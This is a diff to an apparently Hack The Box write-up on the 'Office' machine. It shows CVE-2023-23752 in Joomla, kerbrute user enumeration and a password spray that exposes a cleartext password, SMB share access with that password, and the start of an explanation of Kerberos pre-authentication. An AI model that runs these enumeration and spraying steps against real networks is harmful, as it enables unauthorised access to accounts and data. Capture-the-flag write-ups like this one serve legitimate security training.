@@ -186,6 +186,8 @@ So `/administrator` basically leads us right to the login portal for the Joomla!
 
 <figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption><p>Right now, we don't have the creds for it. Saved it for later!</p></figcaption></figure>
 
+## GAINING FOOTHOLD
+
 After a look through the version of this CMS, it is apparently that it was vulnerable to [CVE-2023-23752](https://nvd.nist.gov/vuln/detail/CVE-2023-23752)
 
 {% hint style="warning" %}
@@ -219,26 +221,100 @@ Our scan did not reveal a MySQL database; it could be running on localhost. With
 Now, let's enumerate for valid AD accounts through [kerbrute](https://github.com/ropnop/kerbrute):
 
 ```
-kerbrute userenum -d office.htb --dc 10.129.125.2 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
-    __             __               __
-   / /_____  _____/ /_  _______  __/ /____
+kerbrute userenum -d office.htb --dc 10.129.224.247 /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
 
-Version: dev (n/a) - 02/19/24 - Ronnie Flathers @ropnop
+Version: v1.0.3 (9dad6e1) - 02/27/24 - Ronnie Flathers @ropnop
 
-2024/02/19 18:15:15 >  Using KDC(s):
-2024/02/19 18:15:15 >  10.129.125.2:88
+2024/02/27 12:38:42 >  Using KDC(s):
+2024/02/27 12:38:42 >  	10.129.224.247:88
 
-2024/02/19 18:15:40 >  [+] VALID USERNAME:       administrator@office.htb
-2024/02/19 18:16:23 >  [+] VALID USERNAME:       Administrator@office.htb
-2024/02/19 18:17:26 >  [+] VALID USERNAME:       ewhite@office.htb
-2024/02/19 18:17:26 >  [+] VALID USERNAME:       etower@office.htb
-2024/02/19 18:17:26 >  [+] VALID USERNAME:       dwolfe@office.htb
-2024/02/19 18:18:29 >  [+] VALID USERNAME:       dlanor@office.htb
-2024/02/19 18:18:29 >  [+] VALID USERNAME:       dmichael@office.htb
+2024/02/27 12:38:43 >  [+] VALID USERNAME:	 administrator@office.htb
+2024/02/27 12:38:46 >  [+] VALID USERNAME:	 Administrator@office.htb
+2024/02/27 12:38:47 >  [+] VALID USERNAME:	 ewhite@office.htb
+2024/02/27 12:38:47 >  [+] VALID USERNAME:	 etower@office.htb
+2024/02/27 12:38:47 >  [+] VALID USERNAME:	 dwolfe@office.htb
+2024/02/27 12:38:47 >  [+] VALID USERNAME:	 dlanor@office.htb
+2024/02/27 12:38:47 >  [+] VALID USERNAME:	 dmichael@office.htb
+2024/02/27 12:39:29 >  [+] VALID USERNAME:	 hhogan@office.htb
+2024/02/27 12:39:40 >  [+] VALID USERNAME:	 DWOLFE@office.htb
+2024/02/27 12:42:21 >  [+] VALID USERNAME:	 DLANOR@office.htb
+2024/02/27 12:45:12 >  [+] VALID USERNAME:	 tstark@office.htb
 ```
+
+Using the previous credential to bruteforce together with the list of usernames:
+
+```
+kerbrute passwordspray -d office.htb --dc 10.10.11.3 usernames.txt H0lOgrams4reTakIng0Ver754!
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 02/27/24 - Ronnie Flathers @ropnop
+
+[+] VALID LOGIN WITH ERROR:       dwolfe@office.htb:H0lOgrams4reTakIng0Ver754!    (Clock skew is too great)
+Done! Tested 11 logins (1 successes) in 0.445 seconds
+```
+
+So, with this, we can have a deeper look on SMB:
+
+```
+smbclient -U dwolfe@office.htb%H0lOgrams4reTakIng0Ver754! -L //10.129.224.247
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SOC Analysis    Disk      
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+
+smbclient -U dwolfe@office.htb%H0lOgrams4reTakIng0Ver754! //10.129.224.247/SOC\ Analysis
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed May 10 19:52:24 2023
+  ..                                DHS        0  Wed Feb 14 10:18:31 2024
+  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 01:59:00 2023
+
+		6265599 blocks of size 4096. 1124266 blocks available
+smb: \> get Latest-System-Dump-8fbc124d.pcap
+getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (31178.6 KiloBytes/sec) (average 31178.7 KiloBytes/sec)
+smb: \> exit
+```
+
+Discovering an intriguing PCAP file while browsing the shares, so let's take a closer look at it.
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption><p>Wow!!</p></figcaption></figure>
+
+### GETTING CREDENTIAL THROUGH KERBEROS PRE-AUTHENTICATION PACKET
+
+In Microsoft Active Directory, Kerberos is the most widely used authentication protocol. In daily usage, it has largely replaced New Technology LAN Manager. The main benefit of Kerberos is that it is far more secure than NTLM.
+
+In a nutshell, the most significant aspect of Kerberos is that it makes use of tickets that domain users can use to authenticate with the Authentication Service (AS) and the Key Distribution Center (KDC). The domain controllers of a domain are typically home to the Kerberos service (KDC & AS).
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption><p>A simple diagram to show how Kerberos Authentication works.</p></figcaption></figure>
+
+Without pre-authentication, we only receive some data that has been encrypted using the user's password as the encryption key. We do not actually receive the user's password or even a hash. The encrypted data is then bruteforced using a wordlist until a password is found in the list that, when used to decrypt the encrypted data, results in useable data.
+
+{% hint style="info" %}
+And because of this, the original Kerberos 4 protocol was vulnerable to offline dictionary and brute force attacks. So, in the next iteration, Kerberos 5 introduced Pre-Authentication.
+{% endhint %}
+
+When pre-authentication is turned on, a user sends an authentication server request (AS-REQ) message to the domain controller (DC) in order to initiate the Kerberos authentication process. As part of the AS-REQ packet, it encrypts the current time and sends it to the server. **The encryption key used is the user's password**.
+
+\-> So&#x20;
+
+
 
 
 
